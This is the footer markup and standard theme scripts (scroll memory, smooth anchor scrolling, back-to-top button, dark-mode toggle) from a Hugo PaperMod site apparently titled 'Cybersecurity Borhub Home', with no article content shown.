        <span>&copy; 2025 <a href="https://borhuub.github.io/">Cybersecurity Borhub Home</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
